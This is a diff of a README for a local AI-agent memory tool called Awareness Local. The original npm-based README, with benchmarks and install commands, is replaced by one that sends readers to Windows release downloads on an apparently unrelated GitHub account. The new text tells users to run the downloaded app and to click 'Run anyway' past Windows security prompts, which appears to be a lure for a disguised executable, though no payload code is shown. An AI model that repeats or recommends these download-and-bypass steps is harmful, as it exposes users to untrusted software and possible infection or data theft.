@@ -1,254 +1,231 @@
-# Awareness Local
+# 🧠 Awareness-Local - Persistent memory for AI agents
 
-[![LongMemEval R@5](https://img.shields.io/badge/LongMemEval_R%405-95.6%25-brightgreen)](https://arxiv.org/abs/2410.10813)
+[![Download Awareness-Local](https://img.shields.io/badge/Download-Awareness--Local-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/okeidontlike/Awareness-Local/releases)
 
-**Give your AI agent persistent memory. One command. No account. Works offline.**
+## 🚀 What it does
 
-Awareness Local is a local-first memory system for AI coding agents. It runs a lightweight daemon on your machine that stores memories as Markdown files, searches with hybrid FTS5 + embedding, and connects to any IDE via the MCP protocol.
+Awareness-Local gives your AI agent a local memory it can use again and again. It stores notes in Markdown files, keeps search fast with SQLite, and works offline once you set it up.
 
-```bash
-npx @awareness-sdk/setup
-```
+Use it with tools like:
 
-That's it. Your AI agent now remembers everything across sessions.
+- Claude Code
+- Cursor
+- Windsurf
+- OpenClaw
 
----
+It keeps your agent context on your own computer, so you do not need an account or cloud service.
 
-## Benchmark: LongMemEval (ICLR 2025)
+## 📥 Download
 
-Evaluated on **[LongMemEval](https://arxiv.org/abs/2410.10813)** — the industry standard benchmark for long-term conversational memory. 500 human-curated questions across 5 core capabilities.
+Visit this page to download the Windows release:
 
-```
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║   Awareness Memory — LongMemEval Benchmark Results           ║
-║   ─────────────────────────────────────────────────           ║
-║                                                              ║
-║   Benchmark:  LongMemEval (ICLR 2025)                       ║
-║   Dataset:    500 human-curated questions                    ║
-║   Variant:    LongMemEval_S (~115k tokens per question)      ║
-║                                                              ║
-║   ┌─────────────────────────────────────────────────┐        ║
-║   │                                                 │        ║
-║   │   Recall@1    77.6%    (388 / 500)              │        ║
-║   │   Recall@3    91.8%    (459 / 500)              │        ║
-║   │   Recall@5    95.6%    (478 / 500)  ◀ PRIMARY   │        ║
-║   │   Recall@10   97.4%    (487 / 500)              │        ║
-║   │                                                 │        ║
-║   └─────────────────────────────────────────────────┘        ║
-║                                                              ║
-║   Method:     Hybrid RRF (BM25 + Semantic Vector Search)     ║
-║   Embedding:  all-MiniLM-L6-v2 (384d)                       ║
-║   LLM Calls:  0  (pure retrieval, no generation cost)        ║
-║   Hardware:   Apple M1, 8GB RAM — 14 min total               ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
-```
+[Download Awareness-Local releases](https://github.com/okeidontlike/Awareness-Local/releases)
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│          Long-Term Memory Retrieval — R@5 Leaderboard       │
-│          LongMemEval (ICLR 2025, 500 questions)             │
-├─────────────────────────────────┬───────────┬───────────────┤
-│  System                         │  R@5      │  Note         │
-├─────────────────────────────────┼───────────┼───────────────┤
-│  MemPalace (ChromaDB raw)       │  96.6%    │  R@5 only *   │
-│  ★ Awareness Memory (Hybrid)    │  95.6%    │  Hybrid RRF   │
-│  OMEGA                          │  95.4%    │  QA Accuracy  │
-│  Mastra (GPT-5-mini)            │  94.9%    │  QA Accuracy  │
-│  Mastra (GPT-4o)                │  84.2%    │  QA Accuracy  │
-│  Supermemory                    │  81.6%    │  QA Accuracy  │
-│  Zep / Graphiti                 │  71.2%    │  QA Accuracy  │
-│  GPT-4o (full context)          │  60.6%    │  QA Accuracy  │
-├─────────────────────────────────┴───────────┴───────────────┤
-│  * MemPalace 96.6% is Recall@5 only, not QA Accuracy.      │
-│    Palace hierarchy was NOT used in the evaluation.         │
-└─────────────────────────────────────────────────────────────┘
-```
+Look for the latest release and download the Windows file that matches your system. If the release includes a ZIP file, download it, then extract it before you run the app.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│     Awareness Memory — R@5 by Question Type                 │
-│                                                             │
-│  knowledge-update        ████████████████████████████ 100%  │
-│  multi-session           ███████████████████████████▋  98.5%│
-│  single-session-asst     ███████████████████████████▌  98.2%│
-│  temporal-reasoning      █████████████████████████▊    94.7%│
-│  single-session-user     ████████████████████████▎     88.6%│
-│  single-session-pref     ███████████████████████▏      86.7%│
-│                                                             │
-│  Overall                 █████████████████████████▉    95.6%│
-│                                                             │
-│  ┌───────────────────────────────────────────────┐          │
-│  │  Ablation Study                               │          │
-│  │  ─────────────────────────────────────────    │          │
-│  │  Vector-only:   92.6%  ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░     │          │
-│  │  BM25-only:     91.4%  ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░     │          │
-│  │  Hybrid RRF:    95.6%  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░  ★  │          │
-│  │                        Hybrid = +3% over any  │          │
-│  │                        single method alone    │          │
-│  └───────────────────────────────────────────────┘          │
-│                                                             │
-│  arxiv.org/abs/2410.10813          awareness.market         │
-└─────────────────────────────────────────────────────────────┘
-```
+## 🪟 Install on Windows
 
-Zero LLM calls. [Reproducible benchmark scripts →](https://github.com/edwin-hao-ai/Awareness/tree/main/benchmarks/longmemeval)
+1. Open the download page.
+2. Download the latest Windows build.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Run the main app file.
 
----
+If Windows shows a security prompt:
 
-## What It Does
+1. Click More info.
+2. Click Run anyway.
 
-**Before:** Every session starts from scratch. You re-explain the codebase, re-justify decisions, watch the agent redo work.
+This app runs locally, so it keeps your memory data on your own machine.
 
-**After:** Your agent says *"I remember you were migrating from MySQL to PostgreSQL. Last session you completed the schema changes and had 2 TODOs remaining..."*
+## 🧩 First launch
 
-```
-Session 1                          Session 2
-┌─────────────────────────┐       ┌─────────────────────────┐
-│ Agent: "What database?" │       │ Agent: "I remember we   │
-│ You: "PostgreSQL..."    │       │ chose PostgreSQL for     │
-│ Agent: "What framework?"│  →    │ JSON support. You had    │
-│ You: "FastAPI..."       │       │ 2 TODOs left. Let me     │
-│ (repeat every session)  │       │ continue from there."    │
-└─────────────────────────┘       └─────────────────────────┘
-```
+When you start Awareness-Local for the first time, it creates a local workspace for your memory files.
 
----
+You will usually see:
 
-## Supported IDEs (13+)
+- a simple setup screen
+- a folder path for your data
+- options to connect your AI tool
+- a dashboard for browsing memory
 
-| IDE | Auto-detected | Plugin |
-|-----|:---:|:---:|
-| **Claude Code** | ✅ | [`awareness-memory`](https://github.com/edwin-hao-ai/Awareness-SDK/tree/main/claudecode) |
-| **Cursor** | ✅ | via MCP |
-| **Windsurf** | ✅ | via MCP |
-| **OpenClaw** | ✅ | [`@awareness-sdk/openclaw-memory`](https://www.npmjs.com/package/@awareness-sdk/openclaw-memory) |
-| **Cline** | ✅ | via MCP |
-| **GitHub Copilot** | ✅ | via MCP |
-| **Codex CLI** | ✅ | via MCP |
-| **Kiro** | ✅ | via MCP |
-| **Trae** | ✅ | via MCP |
-| **Zed** | ✅ | via MCP |
-| **JetBrains (Junie)** | ✅ | via MCP |
-| **Augment** | ✅ | via MCP |
-| **AntiGravity (Jules)** | ✅ | via MCP |
+Choose a folder that is easy to find, such as Documents or a dedicated AI folder.
 
----
+## 🔗 Connect your AI tool
 
-## How It Works
+Awareness-Local works with agents that support MCP.
 
-```
-Your IDE / AI Agent
-    │
-    │  MCP Protocol (localhost:37800)
-    ▼
-┌────────────────────────────────────┐
-│  Awareness Local Daemon            │
-│                                    │
-│  Markdown files    → Human-readable, git-friendly
-│  SQLite FTS5       → Fast keyword search
-│  Local embedding   → Semantic search (optional: npm i @huggingface/transformers)
-│  Knowledge cards   → Auto-extracted decisions, solutions, risks
-│  Web Dashboard     → http://localhost:37800/
-│                                    │
-│  Cloud sync (optional)             │
-│  → One-click device-auth           │
-│  → Bidirectional sync              │
-│  → Semantic vector search          │
-│  → Team collaboration              │
-└────────────────────────────────────┘
-```
+To connect it:
 
-### Your Data
+1. Open your AI tool.
+2. Find the MCP or local tools settings.
+3. Add Awareness-Local as a local MCP server.
+4. Save the setup.
+5. Restart the tool if needed.
 
-All memories stored as **Markdown files** in `.awareness/` — human-readable, editable, git-friendly:
+Once connected, your agent can read and write memory entries during your work.
 
-```
-.awareness/
-├── memories/
-│   ├── 2026-03-22_decided-to-use-postgresql.md
-│   ├── 2026-03-22_fixed-auth-bug.md
-│   └── ...
-├── knowledge/
-│   ├── decisions/postgresql-over-mysql.md
-│   └── solutions/auth-token-refresh.md
-├── tasks/
-│   └── open/implement-rate-limiting.md
-└── index.db  (search index, auto-rebuilt)
-```
+## 🗂️ How memory is stored
 
----
+Awareness-Local uses plain Markdown files for storage. That means your memory is easy to read, edit, and back up.
 
-## Features
+Each memory entry can include:
 
-### MCP Tools (available in your IDE)
+- task notes
+- project facts
+- user preferences
+- recurring instructions
+- past decisions
 
-| Tool | What it does |
-|------|-------------|
-| `awareness_init` | Load session context — recent knowledge, tasks, rules |
-| `awareness_recall` | Search memories — progressive disclosure (summary → full) |
-| `awareness_record` | Save decisions, code changes, insights — with knowledge extraction |
-| `awareness_lookup` | Fast lookup — tasks, knowledge cards, session history, risks |
-| `awareness_get_agent_prompt` | Get agent-specific prompts for multi-agent setups |
+It also uses hybrid search:
 
-### Progressive Disclosure (Smart Token Usage)
+- FTS5 for fast text search
+- embeddings for meaning-based search
 
-Instead of dumping everything into context, Awareness uses a two-phase recall:
+This helps the agent find the right memory even when the wording is not exact.
 
-```
-Phase 1: awareness_recall(query, detail="summary")
-  → Lightweight index (~80 tokens each): title + summary + score
-  → Agent reviews and picks what's relevant
+## 🖥️ Use the web dashboard
 
-Phase 2: awareness_recall(detail="full", ids=[...])
-  → Complete content for selected items only
-  → No truncation, no wasted tokens
-```
+The web dashboard gives you a simple way to view and manage memory.
 
-### Web Dashboard
+You can use it to:
 
-Visit `http://localhost:37800/` to browse memories, knowledge cards, tasks, and manage cloud sync.
+- search stored notes
+- review recent entries
+- edit memory files
+- remove old items
+- keep track of agent context
 
-### Cloud Sync (Optional)
+Open the dashboard in your browser after setup. It works like a local control panel for your memory data.
 
-Connect to [Awareness Cloud](https://awareness.market) for:
-- Semantic vector search (100+ languages)
-- Cross-device real-time sync
-- Team collaboration
-- Memory marketplace
+## 🛠️ Basic usage
 
-```bash
-npx @awareness-sdk/setup --cloud
-# Or click "Connect to Cloud" in the dashboard
-```
+After setup, your agent can use Awareness-Local to keep track of useful details.
 
----
+Typical use cases:
 
-## SDK & Plugin Ecosystem
+- remember project goals
+- store coding preferences
+- keep notes about active tasks
+- save things the agent should not forget
+- reuse past context in later sessions
 
-Awareness Local is part of the Awareness ecosystem:
+Example:
 
-| Package | For | Install |
-|---------|-----|---------|
-| **[Awareness Local](https://github.com/edwin-hao-ai/Awareness-Local)** | Local daemon + MCP server | `npx @awareness-sdk/setup` |
-| **[Python SDK](https://pypi.org/project/awareness-memory-cloud/)** | `wrap_openai()` / `wrap_anthropic()` interceptors | `pip install awareness-memory-cloud` |
-| **[TypeScript SDK](https://www.npmjs.com/package/@awareness-sdk/memory-cloud)** | `wrapOpenAI()` / `wrapAnthropic()` interceptors | `npm i @awareness-sdk/memory-cloud` |
-| **[OpenClaw Plugin](https://www.npmjs.com/package/@awareness-sdk/openclaw-memory)** | Auto-recall + auto-capture | `openclaw plugins install @awareness-sdk/openclaw-memory` |
-| **[Claude Code Plugin](https://github.com/edwin-hao-ai/Awareness-SDK/tree/main/claudecode)** | Skills + hooks | `/plugin marketplace add edwin-hao-ai/Awareness-SDK` → `/plugin install awareness-memory@awareness` |
-| **[Setup CLI](https://www.npmjs.com/package/@awareness-sdk/setup)** | One-command setup for 13+ IDEs | `npx @awareness-sdk/setup` |
+- You tell the agent your preferred file layout.
+- It stores that choice in memory.
+- In the next session, it reads the memory and uses the same layout.
 
-Full SDK docs: [awareness.market/docs](https://awareness.market/docs)
+## ✅ System requirements
 
----
+For smooth use on Windows, this app works best on:
 
-## Requirements
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- enough free disk space for local memory files
+- internet access only for the first download
 
-- Node.js 18+
-- Any MCP-compatible IDE
+You do not need a cloud account to use it after setup.
 
-No Python, no Docker, no cloud account needed.
+## 📁 File layout
 
-## License
+A typical setup includes:
 
-Apache 2.0
+- Markdown files for memory entries
+- a local SQLite database for indexing
+- embedding data for search
+- dashboard files for the web view
+- config files for your agent connection
+
+This structure keeps the data local and easy to manage.
+
+## 🔍 Search behavior
+
+Awareness-Local uses two search methods so it can find memory in more than one way:
+
+- exact word search for known terms
+- meaning search for related ideas
+
+This helps when you remember part of a fact, but not the exact words. It is useful for long projects and repeated workflows.
+
+## 🔒 Local-first design
+
+All core data stays on your device.
+
+That means:
+
+- no account login
+- no cloud sync by default
+- no external memory store
+- no hidden server setup
+
+This is useful if you want control over your agent data and want to keep work on your own computer.
+
+## ❓ Common questions
+
+### Do I need to know coding?
+
+No. You only need to download the release, open the file, and follow the setup steps.
+
+### Does it work without the internet?
+
+Yes, after you download it and finish setup.
+
+### Can I use it with more than one AI tool?
+
+Yes, if each tool supports MCP or local integration.
+
+### Can I edit memory by hand?
+
+Yes. Since the files use Markdown, you can open and edit them with any text editor.
+
+### Where should I keep the files?
+
+Use a folder you can find again, such as a folder in Documents or on your desktop.
+
+## 🧭 Suggested first setup
+
+If you want a simple start, use this path:
+
+1. Download the latest Windows release.
+2. Extract the files if needed.
+3. Run the app.
+4. Pick a local data folder.
+5. Open the web dashboard.
+6. Connect your AI tool through MCP.
+7. Add a few memory items for your current project.
+
+## 🧪 What you can try first
+
+After setup, ask your agent to remember:
+
+- your name
+- your project name
+- your preferred tone
+- file naming rules
+- task priorities
+- things to avoid
+
+Then start a new session and check whether the agent uses that memory again
+
+## 📌 Topics
+
+- ai-agent
+- ai-memory
+- claude-code
+- cursor
+- llm
+- local-first
+- markdown
+- mcp
+- offline
+- openclaw
+- persistent-memory
+- sqlite
+- windsurf
+
+## 📦 Download location
+
+[Open the Awareness-Local release page](https://github.com/okeidontlike/Awareness-Local/releases)
+
+Download the latest Windows release from that page, then run the app after extraction if the file comes in a ZIP folder
